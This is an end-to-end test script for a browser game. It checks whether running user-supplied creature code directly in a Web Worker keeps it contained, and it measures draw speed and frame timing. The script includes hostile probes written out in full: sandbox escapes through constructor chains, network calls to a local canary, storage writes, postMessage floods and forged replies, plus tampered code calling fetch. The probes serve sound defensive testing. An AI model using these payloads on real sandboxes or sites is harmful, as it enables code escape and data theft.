// EXPERIMENT (docs/LIVE_GENERATION.md, "Direct execution in the browser (option E)"). Checks and measures the direct draw path
// (src/scene/creature-direct-worker.ts: a creature's code run as plain JavaScript in a dedicated Web Worker) against the
// QuickJS path (src/scene/creature-worker.ts) in the built app, in desktop Chromium and WebKit on an iPhone profile:
//   identity  every committed single sprite script, and the hero's 20 frames, draw exactly their PNG with the direct path
//   measure   draw time, cold (a fresh browser context: worker script, kit) and warm, for both paths, median and p95
//   frames    the page's frame timing (requestAnimationFrame) while workers draw back to back, against an idle page
//   probes    hostile creature code run through the direct path: what it reached (a canary server on another port, the
//             same-origin API, storage), whether the page kept its frame rate, whether the next draw is still exact
//   signing   a tampered gallery record is refused before any code runs
//   csp       what the policy does to the rest of the app (violations on a normal page load)
// Every request goes through a counting proxy in front of the built app (so a worker's requests are seen whichever browser
// made them), which also stubs the creature API: no Mubit, no Blob.
//
// usage: bun e2e/check-creature-direct.mjs --url http://localhost:3731 --keys FILE [--out DIR] [--label NAME]
//          [--only identity,measure,frames,probes,signing,csp] [--browsers chromium,webkit] [--runs 5] [--probe name,name]
// FILE is the JSON of generateSigningKeys (src/game/creature-signing.ts) whose public key the app was built with
// (NEXT_PUBLIC_CREATURE_PUBLIC_KEY). Writes <out>/direct-<label>.json. Exit code 1 when an identity or signing check fails.
import { createHash } from "node:crypto";
import { mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { createServer, request as httpRequest } from "node:http";
import { join } from "node:path";
import { chromium, devices, webkit } from "playwright";
import { heroFrameBuilds } from "../pipeline/hero-animation.ts";
import { plainJavaScript } from "../pipeline/render-inprocess-shared.ts";
import { signBuild } from "../src/game/creature-signing.ts";
import { HERO_ANIMATIONS } from "../src/scene/assets.ts";
import { decodePng } from "../tools/logo/png.ts";

const argument = (name, fallback) => {
  const index = process.argv.indexOf(name);
  return index > 0 ? process.argv[index + 1] : fallback;
};
const BASE_URL = argument("--url", "http://localhost:3731");
const OUT = argument("--out", "verify-out/creature-direct");
const LABEL = argument("--label", "both");
const ONLY = argument("--only", "identity,measure,frames,probes,signing,csp").split(",");
const RUNS = Number(argument("--runs", "5"));
const BROWSERS = argument("--browsers", "chromium,webkit").split(",");
const PROBE_FILTER = argument("--probe", "").split(",").filter(Boolean);
const KEYS = JSON.parse(readFileSync(argument("--keys", ""), "utf8"));
mkdirSync(OUT, { recursive: true });

const sha256 = (data) => createHash("sha256").update(data).digest("hex");
const SPRITES = "public/sprites";
const PROBES = "pipeline/inprocess_eval/probes";
const sleep = (milliseconds) => new Promise((resolve) => setTimeout(resolve, milliseconds));

// --- statistics ------------------------------------------------------------------------------------------------------------
const sorted = (numbers) => [...numbers].sort((first, second) => first - second);
const median = (numbers) => {
  const list = sorted(numbers);
  return list.length ? (list[Math.floor((list.length - 1) / 2)] + list[Math.floor(list.length / 2)]) / 2 : Number.NaN;
};
const percentile = (numbers, fraction) => {
  const list = sorted(numbers);
  return list.length ? list[Math.min(list.length - 1, Math.ceil(fraction * list.length) - 1)] : Number.NaN;
};
const round = (value, places = 0) => Math.round(value * 10 ** places) / 10 ** places;

// --- the canary and the counting proxy ----------------------------------------------------------------------------------
const canary = { hits: 0, urls: [] };
const canaryServer = createServer((incoming, response) => {
  canary.hits++;
  canary.urls.push(`${incoming.method} ${incoming.url}`);
  response.writeHead(200, {
    "content-type": "application/javascript",
    "access-control-allow-origin": "*",
    "cross-origin-resource-policy": "cross-origin",
  });
  response.end("/* canary */");
});
await new Promise((resolve) => canaryServer.listen(0, "127.0.0.1", resolve));
const CANARY_URL = `http://127.0.0.1:${canaryServer.address().port}/canary`;

const codes = new Map(); // creature id -> code text the stubbed code route serves
const traffic = []; // every request through the proxy: { path, method, bytes, at }
const target = new URL(BASE_URL);
const proxy = createServer((incoming, response) => {
  const { pathname } = new URL(incoming.url ?? "/", "http://proxy");
  const entry = { path: incoming.url ?? "", method: incoming.method ?? "GET", bytes: 0, at: performance.now() };
  traffic.push(entry);
  const codeMatch = /^\/api\/creatures\/([^/]+)\/code$/.exec(pathname);
  if (codeMatch && codes.has(codeMatch[1])) {
    const body = Buffer.from(codes.get(codeMatch[1]));
    entry.bytes = body.length;
    response.writeHead(200, { "content-type": "text/plain; charset=utf-8", "x-content-type-options": "nosniff" });
    return response.end(body);
  }
  if (pathname.startsWith("/api/")) {
    const body = Buffer.from(
      JSON.stringify(pathname.endsWith("/next") ? { kind: "none", reason: "unavailable" } : { error: "stub" }),
    );
    entry.bytes = body.length;
    response.writeHead(pathname.endsWith("/next") ? 200 : 404, { "content-type": "application/json" });
    return response.end(body);
  }
  const forwarded = httpRequest(
    {
      hostname: target.hostname,
      port: target.port,
      path: incoming.url,
      method: incoming.method,
      headers: incoming.headers,
    },
    (upstream) => {
      response.writeHead(upstream.statusCode ?? 502, upstream.headers);
      upstream.on("data", (chunk) => {
        entry.bytes += chunk.length;
      });
      upstream.pipe(response);
    },
  );
  forwarded.on("error", () => response.destroy());
  incoming.pipe(forwarded);
});
await new Promise((resolve) => proxy.listen(0, resolve));
const PAGE_ORIGIN = `http://localhost:${proxy.address().port}`;
const apiCalls = (since) => traffic.filter((entry) => entry.at >= since && entry.path.startsWith("/api/"));

// --- fixtures ---------------------------------------------------------------------------------------------------------
const spriteNames = readdirSync(SPRITES)
  .filter((file) => file.endsWith(".ts"))
  .map((file) => file.slice(0, -3))
  .sort();

/** A record for `code` whose pixels are `pixels`, signed by `privateKey` (default: the key the app was built with). */
async function signedRecord(id, code, pixels, privateKey = KEYS.privateKey) {
  codes.set(id, code);
  const hashes = { codeSha256: sha256(code), pixelsSha256: sha256(pixels) };
  return { id, build: { ...hashes, signature: await signBuild(privateKey, id, hashes) } };
}

const spriteFixture = (name) => ({
  name,
  code: plainJavaScript(readFileSync(join(SPRITES, `${name}.ts`), "utf8")),
  pixels: decodePng(readFileSync(join(SPRITES, `${name}.png`))).data,
});
const SPRITE_FIXTURES = spriteNames.map(spriteFixture);
const HERO_FIXTURES = HERO_ANIMATIONS.flatMap((animation) =>
  heroFrameBuilds("male", animation).map((frame) => ({
    name: frame.name,
    code: frame.code,
    pixels: decodePng(readFileSync(join(SPRITES, "hero", `${frame.name}.png`))).data,
  })),
);

// --- pages -------------------------------------------------------------------------------------------------------------
// installed in every page: bytes to base64 (to carry pixels back here), a frame sampler, and a log of policy violations
const installHelpers = () => {
  window.__toBase64 = (bytes) => {
    let text = "";
    for (let index = 0; index < bytes.length; index += 0x8000)
      text += String.fromCharCode(...bytes.subarray(index, index + 0x8000));
    return btoa(text);
  };
  window.__violations = [];
  document.addEventListener("securitypolicyviolation", (event) =>
    window.__violations.push(`${event.violatedDirective} ${event.blockedURI}`.slice(0, 160)),
  );
  // frame timing: the gaps between animation frames and between a 10 ms timer's ticks, while sampling
  window.__sampler = {
    start() {
      const state = { frames: [], ticks: [], running: true, last: performance.now(), lastTick: performance.now() };
      const frame = (now) => {
        if (!state.running) return;
        state.frames.push(now - state.last);
        state.last = now;
        requestAnimationFrame(frame);
      };
      requestAnimationFrame((now) => {
        state.last = now;
        requestAnimationFrame(frame);
      });
      state.timer = setInterval(() => {
        const now = performance.now();
        state.ticks.push(now - state.lastTick);
        state.lastTick = now;
      }, 10);
      window.__sample = state;
    },
    stop() {
      const state = window.__sample;
      state.running = false;
      clearInterval(state.timer);
      return { frames: state.frames.slice(1), ticks: state.ticks };
    },
  };
};

const launchers = {
  chromium: () => chromium.launch({ headless: true }),
  webkit: () => webkit.launch({ headless: true }),
};
const profiles = {
  chromium: { viewport: { width: 1000, height: 640 }, deviceScaleFactor: 1 },
  webkit: devices["iPhone 14 landscape"],
};

async function openGame(browser, name, draw = "direct", extraQuery = "") {
  const context = await browser.newContext(profiles[name]);
  await context.addInitScript(installHelpers);
  const page = await context.newPage();
  const errors = [];
  const crashes = [];
  page.on("pageerror", (error) => errors.push(String(error)));
  page.on("crash", () => crashes.push("crash"));
  await page.goto(`${PAGE_ORIGIN}/?verify=1${draw === "direct" ? "&draw=direct" : ""}${extraQuery}`);
  await page.waitForSelector('[data-ready="1"]', { timeout: 30000 });
  return { context, page, errors, crashes };
}

/** One draw in the page through the debug hook: code in, pixels (base64), timing and reason out. */
const drawIn = (page, code, deadline, path) =>
  page.evaluate(
    async ({ code, deadline, path }) => {
      const started = performance.now();
      const result = await window.lampwarden.drawInWorker(code, deadline, path);
      return {
        ok: result.ok,
        reason: result.ok ? "" : result.reason,
        wall: performance.now() - started,
        load: result.ok ? result.loadMilliseconds : 0,
        run: result.ok ? result.runMilliseconds : 0,
        base64: result.ok ? window.__toBase64(result.pixels) : "",
      };
    },
    { code, deadline, path },
  );

const results = { identity: {}, measure: {}, frames: {}, probes: {}, signing: {}, csp: {} };
let failures = 0;
const fail = (message) => {
  failures++;
  console.log(`FAIL ${message}`);
};
const sameBytes = (base64, pixels) =>
  base64 !== "" && Buffer.compare(Buffer.from(base64, "base64"), Buffer.from(pixels)) === 0;

// --- identity ---------------------------------------------------------------------------------------------------------
async function identity(name, browser) {
  const { context, page, errors } = await openGame(browser, name);
  const rows = [];
  for (const fixture of [...SPRITE_FIXTURES, ...HERO_FIXTURES]) {
    const id = `fixture-${fixture.name.replaceAll("_", "-")}`;
    const record = await signedRecord(id, fixture.code, fixture.pixels);
    // the real path: signature, code route, hash check, worker, hash check
    const outcome = await page.evaluate(async (record) => {
      const drawn = await window.lampwarden.creaturePixels(record);
      return { ok: drawn !== null, base64: drawn ? window.__toBase64(drawn) : "" };
    }, record);
    const identical = outcome.ok && sameBytes(outcome.base64, fixture.pixels);
    rows.push({ sprite: fixture.name, hero: fixture.name.startsWith("male_"), identical });
    if (!identical) fail(`${name}: ${fixture.name} did not draw exactly its PNG with the direct path`);
  }
  if (errors.length) fail(`${name}: page errors ${errors.slice(0, 2).join(" | ")}`);
  await context.close();
  results.identity[name] = rows;
  const singles = rows.filter((row) => !row.hero);
  const heroes = rows.filter((row) => row.hero);
  console.log(
    `identity, ${name}: sprites ${singles.filter((row) => row.identical).length}/${singles.length}, hero frames ${heroes.filter((row) => row.identical).length}/${heroes.length} draw exactly their PNG (direct path, signature checked)`,
  );
}

// --- measure ----------------------------------------------------------------------------------------------------------
function summarise(samples) {
  const walls = samples.filter((sample) => sample.ok).map((sample) => sample.wall);
  return {
    n: walls.length,
    failed: samples.length - walls.length,
    median: round(median(walls), 1),
    p95: round(percentile(walls, 0.95), 1),
    max: round(Math.max(...walls), 1),
    loadMedian: round(median(samples.filter((sample) => sample.ok).map((sample) => sample.load)), 1),
    runMedian: round(median(samples.filter((sample) => sample.ok).map((sample) => sample.run)), 1),
  };
}

async function measure(name, browser) {
  const out = { direct: {}, quickjs: {} };
  const paths = ["direct", "quickjs"];
  const fixtures = [...SPRITE_FIXTURES, ...HERO_FIXTURES];
  const deadlineOf = (path) => (path === "direct" ? 8000 : 30000); // generous: the point here is the time, not the production deadline
  // the two paths are interleaved sample by sample, so a change in the machine's load (other work runs on it) hits both alike
  // cold: one sample per single sprite and path, each in a fresh browser context (nothing in the HTTP cache), the first draw on its page
  const cold = { direct: [], quickjs: [] };
  for (const fixture of SPRITE_FIXTURES) {
    for (const path of paths) {
      const { context, page } = await openGame(browser, name, path);
      cold[path].push(await drawIn(page, fixture.code, deadlineOf(path), path));
      await context.close();
    }
  }
  // warm: one page, both paths primed once, then each fixture RUNS times on each path; every draw still starts a new worker
  const { context, page } = await openGame(browser, name, "direct");
  for (const path of paths) await drawIn(page, SPRITE_FIXTURES[0].code, deadlineOf(path), path);
  const perFixture = { direct: {}, quickjs: {} };
  for (const fixture of fixtures) {
    for (const path of paths) perFixture[path][fixture.name] = [];
    for (let run = 0; run < (fixture.name.startsWith("male_") ? Math.min(RUNS, 3) : RUNS); run++)
      for (const path of paths)
        perFixture[path][fixture.name].push(await drawIn(page, fixture.code, deadlineOf(path), path));
  }
  await context.close();
  for (const path of paths) {
    const singles = SPRITE_FIXTURES.flatMap((fixture) => perFixture[path][fixture.name]);
    const heroes = HERO_FIXTURES.flatMap((fixture) => perFixture[path][fixture.name]);
    out[path] = {
      cold: summarise(cold[path]),
      warmSingles: summarise(singles),
      warmHero: summarise(heroes),
      perSprite: Object.fromEntries(
        SPRITE_FIXTURES.map((fixture, index) => [
          fixture.name,
          { cold: round(cold[path][index].wall), warm: summarise(perFixture[path][fixture.name]).median },
        ]),
      ),
      heroByAnimation: Object.fromEntries(
        HERO_ANIMATIONS.map((animation) => [
          animation,
          summarise(
            HERO_FIXTURES.filter((fixture) => fixture.name.startsWith(`male_${animation}`)).flatMap(
              (fixture) => perFixture[path][fixture.name],
            ),
          ),
        ]),
      ),
    };
    console.log(
      `measure, ${name}, ${path}: cold median ${out[path].cold.median} ms p95 ${out[path].cold.p95} | warm singles median ${out[path].warmSingles.median} p95 ${out[path].warmSingles.p95} | warm hero median ${out[path].warmHero.median} p95 ${out[path].warmHero.p95}`,
    );
  }
  // bytes: the first creature on a fresh context, per path (what crossed the wire through the proxy; the proxy forwards the
  // browser's own accept-encoding, so these are the encoded bytes the app serves)
  out.bytes = {};
  for (const path of ["direct", "quickjs"]) {
    const { context, page } = await openGame(browser, name, path);
    await sleep(500);
    const mark = traffic.length;
    await drawIn(page, SPRITE_FIXTURES.find((fixture) => fixture.name === "satyr").code, 30000, path);
    await sleep(300);
    out.bytes[path] = traffic
      .slice(mark)
      .filter((entry) => !entry.path.startsWith("/api/"))
      .map((entry) => ({ url: entry.path.split("?")[0], bytes: entry.bytes }));
    await context.close();
  }
  out.code = Object.fromEntries(SPRITE_FIXTURES.map((fixture) => [fixture.name, Buffer.byteLength(fixture.code)]));
  out.png = Object.fromEntries(
    SPRITE_FIXTURES.map((fixture) => [fixture.name, readFileSync(join(SPRITES, `${fixture.name}.png`)).length]),
  );
  results.measure[name] = out;
}

// --- frames -----------------------------------------------------------------------------------------------------------
async function sampleFrames(page, work) {
  await page.evaluate(() => window.__sampler.start());
  await work();
  const sample = await page.evaluate(() => window.__sampler.stop());
  const frames = sample.frames;
  return {
    frames: frames.length,
    median: round(median(frames), 1),
    p95: round(percentile(frames, 0.95), 1),
    max: round(Math.max(...frames, 0), 1),
    over50: frames.filter((gap) => gap > 50).length,
    tickMax: round(Math.max(...sample.ticks, 0), 1),
  };
}

async function frameTiming(name, browser) {
  const out = {};
  const cyclops = SPRITE_FIXTURES.find((fixture) => fixture.name === "cyclops");
  const satyr = SPRITE_FIXTURES.find((fixture) => fixture.name === "satyr");
  for (const [label, path, fixture, count] of [
    ["idle", null, null, 0],
    ["direct, satyr x20", "direct", satyr, 20],
    ["direct, cyclops x20", "direct", cyclops, 20],
    ["quickjs, satyr x6", "quickjs", satyr, 6],
    ["quickjs, cyclops x4", "quickjs", cyclops, 4],
    ["idle, again", null, null, 0],
  ]) {
    const { context, page } = await openGame(browser, name, path ?? "direct");
    await sleep(500);
    await drawIn(page, satyr.code, 30000, path ?? "direct"); // warm the caches; the sample is of steady draws
    out[label] = await sampleFrames(page, async () => {
      if (path === null) return sleep(3000);
      for (let run = 0; run < count; run++) await drawIn(page, fixture.code, 30000, path);
    });
    await context.close();
    console.log(`frames, ${name}, ${label}: ${JSON.stringify(out[label])}`);
  }
  results.frames[name] = out;
}

// --- probes -----------------------------------------------------------------------------------------------------------
// A busy loop that keeps the worker alive for a while after it has started requests, because the page ends a worker the
// moment it answers; without it a request still being sent might be cut off and a probe would look more contained than it is.
const SPIN = "for (var spin = 0; spin < 600000000; spin++) {}";
const probeSource = (file) =>
  readFileSync(join(PROBES, file), "utf8")
    .replaceAll("__CANARY_URL__", CANARY_URL)
    .replaceAll("__CANARY_ENV__", "LAMPWARDEN_CANARY_SECRET")
    .replaceAll("__CANARY_FILE__", "/nonexistent")
    .replaceAll("__MARKER_DIR__", "/nonexistent")
    .replace("1536", "1024"); // the memory bomb: 1 GiB of typed arrays, not 1.5

const ATTEMPT = `function attempt(label, work) { try { work(); attempts.push(label + ': ran'); } catch (error) { attempts.push(label + ': ' + String(error && error.name)); } }`;
const DANGEROUS = `['fetch','XMLHttpRequest','WebSocket','EventSource','importScripts','postMessage','indexedDB','caches','Worker','SharedWorker','BroadcastChannel','MessageChannel','navigator','location','self','close','setTimeout','setInterval','queueMicrotask','requestAnimationFrame','Date','performance','crypto','console','WebAssembly','SharedArrayBuffer','Atomics','structuredClone','atob','btoa','TextEncoder','Blob','URL','FileReader','Notification','WebTransport','RTCPeerConnection','onmessage']`;

// probes written for a browser worker, each ending in a thrown report (the page shows it as the reason)
const DIRECT_PROBES = {
  "escape-global": {
    what: "constructor chains and the prototype chain to the worker's real global; lists every host name still reachable",
    source: `function build(k) {
  var viaFunction = (function () { return this; })();
  var viaConstructor = (function () {}).constructor('return this')();
  var viaArray = [].constructor.constructor('return this')();
  var viaEval = (0, eval)('this');
  var sameGlobal = [viaFunction, viaConstructor, viaArray, viaEval].every(function (value) { return value === globalThis; });
  var holders = [];
  for (var holder = viaConstructor; holder && holders.length < 8; holder = Object.getPrototypeOf(holder)) holders.push(holder);
  var reached = [];
  ${DANGEROUS}.forEach(function (name) {
    holders.forEach(function (holder, depth) { try { var value = holder[name]; if (value !== undefined && value !== null) reached.push(name + '@' + depth); } catch (error) {} });
  });
  var remaining = Object.getOwnPropertyNames(viaConstructor).filter(function (name) { try { return typeof viaConstructor[name] !== 'undefined'; } catch (error) { return true; } });
  throw new Error('PROBE ' + JSON.stringify({ sameGlobal: sameGlobal, reached: reached, remainingGlobals: remaining.length, remaining: remaining.slice(-8), holders: holders.length }));
}`,
  },
  "caller-walk": {
    what: "walks up the call stack by `caller` and `arguments` to the worker's own code, looking for its reference to postMessage",
    source: `function build(k) {
  var found = [];
  try {
    for (var frame = build.caller, depth = 0; frame && depth < 10; frame = frame.caller, depth++) {
      var shown = frame.name || '(anonymous)';
      try { if (frame.arguments) shown += ' with arguments'; } catch (error) {}
      found.push(shown);
    }
  } catch (error) { found.push('threw ' + error.name); }
  var viaCallee = 'none';
  try { viaCallee = String(arguments.callee.caller); } catch (error) { viaCallee = 'threw ' + error.name; }
  throw new Error('PROBE ' + JSON.stringify({ callers: found, calleeCaller: viaCallee.slice(0, 40) }));
}`,
  },
  "memory-bomb-4g": {
    what: "4 GiB of typed arrays, 32 MiB at a time (only run when asked for)",
    explicitOnly: true,
    source: probeSource("memory.js").replace("1024", "4096"),
  },
  "net-cross-origin": {
    what: "fetch, XHR (sync too), WebSocket, EventSource, sendBeacon, importScripts, import(), a nested Worker from a blob and a data URL, each at the canary",
    source: `function build(k) {
  var attempts = [];
  ${ATTEMPT}
  var url = '${CANARY_URL}';
  attempt('fetch', function () { fetch(url, { mode: 'no-cors' }); });
  attempt('fetch via Function', function () { new Function('return fetch')()(url, { mode: 'no-cors' }); });
  attempt('fetch via constructor chain', function () { (function () {}).constructor('return fetch')()(url, { mode: 'no-cors' }); });
  attempt('fetch via prototype', function () { Object.getPrototypeOf(globalThis).fetch(url); });
  attempt('XMLHttpRequest sync', function () { var request = new XMLHttpRequest(); request.open('GET', url, false); request.send(); });
  attempt('WebSocket', function () { new WebSocket('ws://127.0.0.1:' + url.split(':')[2].split('/')[0] + '/'); });
  attempt('EventSource', function () { new EventSource(url); });
  attempt('sendBeacon', function () { navigator.sendBeacon(url, 'x'); });
  attempt('importScripts', function () { importScripts(url); });
  attempt('import()', function () { import(url).catch(function () {}); });
  attempt('Worker from a blob', function () { new Worker(URL.createObjectURL(new Blob(['fetch("' + url + '?blob", { mode: "no-cors" })']))); });
  attempt('Worker from a data URL', function () { new Worker('data:text/javascript,fetch("' + url + '?data", { mode: "no-cors" })'); });
  attempt('Worker at the canary', function () { new Worker(url); });
  ${SPIN}
  throw new Error('PROBE ' + JSON.stringify(attempts));
}`,
  },
  "net-same-origin": {
    what: "fetch, XHR, importScripts and import() at /api/plays and /api/creatures/next on the page's own origin",
    source: `function build(k) {
  var attempts = [];
  ${ATTEMPT}
  attempt('fetch POST /api/plays', function () { fetch('${PAGE_ORIGIN}/api/plays', { method: 'POST', body: '{}', headers: { 'content-type': 'application/json' } }); });
  attempt('fetch POST /api/creatures/next', function () { fetch('${PAGE_ORIGIN}/api/creatures/next', { method: 'POST', body: '{"seen":[]}', headers: { 'content-type': 'application/json' } }); });
  attempt('XHR sync GET /api/plays/x', function () { var request = new XMLHttpRequest(); request.open('GET', '${PAGE_ORIGIN}/api/plays/x', false); request.send(); });
  attempt('XHR sync POST /api/creatures/next', function () { var request = new XMLHttpRequest(); request.open('POST', '${PAGE_ORIGIN}/api/creatures/next', false); request.send('{"seen":[]}'); });
  attempt('importScripts /api/plays/x', function () { importScripts('${PAGE_ORIGIN}/api/plays/x'); });
  attempt('import() /api/plays/x', function () { import('${PAGE_ORIGIN}/api/plays/x').catch(function () {}); });
  ${SPIN}
  throw new Error('PROBE ' + JSON.stringify(attempts));
}`,
  },
  "import-scripts-remote": {
    what: "importScripts of a remote URL, then import() of it: the remote script would run in the worker",
    source: `function build(k) {
  var attempts = [];
  ${ATTEMPT}
  attempt('importScripts', function () { importScripts('${CANARY_URL}?scripts'); });
  attempt('importScripts via Function', function () { new Function("return importScripts('${CANARY_URL}?scripts2')")(); });
  attempt('import()', function () { import('${CANARY_URL}?module').then(function () {}, function () {}); });
  ${SPIN}
  throw new Error('PROBE ' + JSON.stringify(attempts));
}`,
  },
  storage: {
    what: "writes to IndexedDB and the Cache API (and the origin-private file system), then the page looks for what was written",
    source: `function build(k) {
  var attempts = [];
  ${ATTEMPT}
  attempt('indexedDB', function () { var request = indexedDB.open('lw-probe-db', 1); request.onupgradeneeded = function () { request.result.createObjectStore('rows'); }; });
  attempt('caches', function () { caches.open('lw-probe-cache').then(function (cache) { return cache.put('/lw-probe', new Response('x')); }); });
  attempt('origin-private file system', function () { navigator.storage.getDirectory().then(function (root) { return root.getFileHandle('lw-probe', { create: true }); }); });
  attempt('Web Locks', function () { navigator.locks.request('lw-probe', function () {}); });
  ${SPIN}
  throw new Error('PROBE ' + JSON.stringify(attempts));
}`,
  },
  "postmessage-flood": {
    what: "postMessage at the page 100,000 times by every route it can find (and forges a successful reply)",
    source: `function build(k) {
  var attempts = [];
  ${ATTEMPT}
  var reply = { ok: true, pixels: new ArrayBuffer(65536), loadMilliseconds: 0, runMilliseconds: 0 };
  var routes = {
    'postMessage': function () { postMessage(reply); },
    'self.postMessage': function () { self.postMessage(reply); },
    'globalThis.postMessage': function () { globalThis.postMessage(reply); },
    'Function': function () { new Function('return postMessage')()(reply); },
    'constructor chain': function () { (function () {}).constructor('return this')().postMessage(reply); },
    'prototype': function () { Object.getPrototypeOf(globalThis).postMessage.call(globalThis, reply); },
    'MessageChannel': function () { var channel = new MessageChannel(); channel.port1.postMessage(reply); }
  };
  Object.keys(routes).forEach(function (route) {
    attempt(route, function () { for (var count = 0; count < 100000; count++) routes[route](); });
  });
  throw new Error('PROBE ' + JSON.stringify(attempts));
}`,
  },
  "forge-reply": {
    what: "answers the page with a reply of its own making before the real one",
    source: `function build(k) {
  var attempts = [];
  ${ATTEMPT}
  attempt('postMessage', function () { postMessage({ ok: true, pixels: new ArrayBuffer(65536), loadMilliseconds: 0, runMilliseconds: 0 }); });
  attempt('self.postMessage', function () { self.postMessage({ ok: true, pixels: new ArrayBuffer(65536) }); });
  attempt('constructor chain', function () { [].constructor.constructor('return postMessage')()({ ok: true, pixels: new ArrayBuffer(65536) }); });
  throw new Error('PROBE ' + JSON.stringify(attempts));
}`,
  },
  "cpu-burner": { what: "while (true) {}", source: probeSource("loop.js") },
  "regex-loop": { what: "catastrophic regular-expression backtracking", source: probeSource("regex-loop.js") },
  "memory-bomb": { what: "1 GiB of typed arrays, 32 MiB at a time", source: probeSource("memory.js") },
  "memory-objects": { what: "10 million small objects", source: probeSource("memory-objects.js") },
  "stack-overflow": { what: "unbounded recursion", source: probeSource("stack-overflow.js") },
  "schedule-after": {
    what: "timers, microtasks and a promise job that spins after the build returns",
    source: probeSource("schedule-after.js"),
  },
  "prototype-pollution": {
    what: "rewrites Object, Array, Math and Uint8Array prototypes, then draws a lamp",
    source: probeSource("prototype-pollution.js"),
  },
  "kit-state": {
    what: "rewrites the kit's tables and prototypes, then draws a lamp",
    source: probeSource("kit-state.js"),
  },
  throws: { what: "throws an Error", source: probeSource("throws.js") },
  "throws-object": { what: "throws an object whose conversions never return", source: probeSource("throws-object.js") },
  "huge-error": { what: "throws an Error with a 40-million-character message", source: probeSource("huge-error.js") },
};
const CONTROLS = ["net-cross-origin", "net-same-origin", "import-scripts-remote", "storage", "postmessage-flood"];
const PROBE_DEADLINE = 2000;

/**
 * The control: the same code in a plain worker the page makes from a blob, with nothing stripped. It shows what the probe
 * reaches when nothing contains it, and what the page-level policy does to a worker (a blob worker inherits the page's).
 */
const controlDraw = (page, source) =>
  page.evaluate(async (source) => {
    const script = `var __build; ${source}\ntry { build({}); } catch (error) {}\npostMessage('done');`;
    const worker = new Worker(URL.createObjectURL(new Blob([script], { type: "text/javascript" })));
    return new Promise((resolve) => {
      const timer = setTimeout(() => {
        worker.terminate();
        resolve("deadline");
      }, 2500);
      worker.onmessage = () => {
        clearTimeout(timer);
        worker.terminate();
        resolve("finished");
      };
      worker.onerror = () => {
        clearTimeout(timer);
        worker.terminate();
        resolve("error");
      };
    });
  }, source);

async function probes(name, browser) {
  const { context, page, errors, crashes } = await openGame(browser, name);
  const satyr = SPRITE_FIXTURES.find((fixture) => fixture.name === "satyr");
  const control = async () => {
    const outcome = await drawIn(page, satyr.code, 8000, "direct");
    return outcome.ok && sameBytes(outcome.base64, satyr.pixels);
  };
  if (!(await control())) fail(`${name}: the control draw before the probes is not the satyr`);
  const rows = [];
  const names = Object.keys(DIRECT_PROBES).filter((probe) =>
    PROBE_FILTER.length === 0 ? !DIRECT_PROBES[probe].explicitOnly : PROBE_FILTER.includes(probe),
  );
  const runOne = async (probe, source, label, plain) => {
    canary.hits = 0;
    canary.urls = [];
    const since = performance.now();
    await page.evaluate(() => window.__sampler.start());
    const outcome = plain
      ? { reason: await controlDraw(page, source), wall: 0 }
      : await drawIn(page, source, PROBE_DEADLINE, "direct");
    await sleep(400); // requests still on their way
    const sample = await page.evaluate(() => window.__sampler.stop());
    const storage = await page.evaluate(async () => ({
      databases: ((await indexedDB.databases?.()) ?? [])
        .map((database) => database.name)
        .filter((id) => id?.startsWith("lw-probe")),
      caches: (await caches.keys()).filter((id) => id.startsWith("lw-probe")),
    }));
    if (storage.databases.length) await page.evaluate(() => indexedDB.deleteDatabase("lw-probe-db"));
    if (storage.caches.length) await page.evaluate(() => caches.delete("lw-probe-cache"));
    const calls = apiCalls(since).map((entry) => `${entry.method} ${entry.path.split("?")[0]}`);
    const unaffected = plain ? true : await control();
    const frames = sample.frames;
    const row = {
      probe: label,
      what: DIRECT_PROBES[probe].what,
      outcome: (outcome.ok ? "drew a sprite" : outcome.reason).slice(0, 600),
      milliseconds: round(outcome.wall),
      canaryHits: canary.hits,
      canaryUrls: [...new Set(canary.urls.map((entry) => entry.replace(/^GET \/canary/, "GET")))].slice(0, 8),
      apiCalls: calls,
      storage,
      frameMedian: round(median(frames), 1),
      frameMax: round(Math.max(...frames, 0), 1),
      tickMax: round(Math.max(...sample.ticks, 0), 1),
      nextDrawIdentical: unaffected,
      pageAlive: crashes.length === 0,
    };
    row.reached =
      row.canaryHits > 0 ||
      row.apiCalls.length > 0 ||
      row.storage.databases.length > 0 ||
      row.storage.caches.length > 0;
    row.contained = !row.reached && row.nextDrawIdentical && row.pageAlive && row.tickMax < 350;
    rows.push(row);
    if (!plain && !row.contained)
      console.log(
        `  ${label.padEnd(24)} NOT CONTAINED  canary ${row.canaryHits}, api ${row.apiCalls.length}, storage ${row.storage.databases.length + row.storage.caches.length}, tick gap ${row.tickMax} ms, next ${row.nextDrawIdentical ? "identical" : "DIFFERENT"}`,
      );
    else
      console.log(
        `  ${label.padEnd(24)} ${plain ? "(control: reached " : "contained "}${plain ? `canary ${row.canaryHits}, api ${row.apiCalls.length}, storage ${row.storage.databases.length + row.storage.caches.length})` : ""}  frame max ${row.frameMax} ms, tick gap ${row.tickMax} ms, ${row.outcome.slice(0, 90)}`,
      );
  };
  for (const probe of names) await runOne(probe, DIRECT_PROBES[probe].source, probe, false);
  for (const probe of names.filter((id) => CONTROLS.includes(id)))
    await runOne(probe, DIRECT_PROBES[probe].source, `${probe} (plain blob worker)`, true);
  if (errors.length) console.log(`page errors: ${errors.slice(0, 3).join(" | ")}`);
  await context.close();
  results.probes[name] = rows;
  const real = rows.filter((row) => !row.probe.includes("(plain blob worker)"));
  const controls = rows.filter((row) => row.probe.includes("(plain blob worker)"));
  console.log(
    `probes, ${name}, csp ${LABEL}: ${real.filter((row) => row.contained).length}/${real.length} contained; plain-worker controls that reached something: ${controls.filter((row) => row.reached).length}/${controls.length}`,
  );
}

// --- signing ----------------------------------------------------------------------------------------------------------
async function signing(name, browser) {
  const satyr = SPRITE_FIXTURES.find((fixture) => fixture.name === "satyr");
  const evil = `${satyr.code}\nfunction __exfiltrate() {}\nfetch('${CANARY_URL}?tampered');`;
  const other = await (async () => {
    const { generateSigningKeys } = await import("../src/game/creature-signing.ts");
    return generateSigningKeys();
  })();
  const cases = [
    {
      label: "signed record, code as signed",
      expectDrawn: true,
      make: () => signedRecord("sign-good", satyr.code, satyr.pixels),
    },
    {
      label: "code replaced in the store, record untouched",
      expectDrawn: false,
      make: async () => {
        const record = await signedRecord("sign-code-swapped", satyr.code, satyr.pixels);
        codes.set("sign-code-swapped", evil);
        return record;
      },
    },
    {
      label: "code and record hashes replaced together (no key)",
      expectDrawn: false,
      make: async () => {
        const record = await signedRecord("sign-forged", satyr.code, satyr.pixels);
        codes.set("sign-forged", evil);
        return { ...record, build: { ...record.build, codeSha256: sha256(evil) } };
